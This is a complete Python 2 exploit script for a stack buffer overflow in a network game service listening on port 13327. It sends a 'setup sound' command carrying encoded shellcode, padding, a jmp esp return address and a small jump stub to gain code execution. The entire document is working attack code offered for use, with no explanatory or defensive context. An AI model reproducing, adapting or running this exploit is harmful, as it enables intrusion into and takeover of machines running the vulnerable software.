#!/usr/bin/python 
import socket

shellcode = ("\xba\x28\xfa\xc0\x24\xd9\xe9\xd9\x74\x24\xf4\x58\x2b\xc9\xb1"
"\x14\x31\x50\x14\x03\x50\x14\x83\xe8\xfc\xca\x0f\xf1\xff\xfd"
"\x13\xa1\xbc\x52\xbe\x44\xca\xb5\x8e\x2f\x01\xb5\xb4\xf1\xcb"
"\xdd\x48\x0e\xfd\x41\x27\x1e\xac\x29\x3e\xff\x24\xaf\x18\xcd"
"\x39\xa6\xd8\xc9\x8a\xbc\x6a\xb7\x21\x3c\xc9\x88\xdc\xf1\x4e"
"\x7b\x79\x63\x70\x24\xb7\xf3\xc7\xad\xbf\x9b\xf8\x62\x33\x33"
"\x6f\x52\xd1\xaa\x01\x25\xf6\x7c\x8d\xbc\x18\xcc\x3a\x72\x5a")

#\x00\x0a\x0d\x20" are exluded from the shellcide above

host = "127.0.0.1" 

#crash= "\x43" * (4368)  + "\x63\x2c\x14\x08" + "\x83\xC0\x0C\xFF\xE0" + "\x90\x90"
crash= shellcode + "\x43" * (4368 - 105)  + "\x63\x2c\x14\x08" + "\x83\xC0\x0C\xFF\xE0" + "\x90\x90"
#0x08142c63: jmp esp
buffer = "\x11(setup sound " + crash  + "\x90\x00#"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
print "[*]Sending evil buffer..."
s.connect((host, 13327))
data=s.recv(1024) 
print data 
s.send(buffer) 
s.close()
print "[*]Payload Sent !"
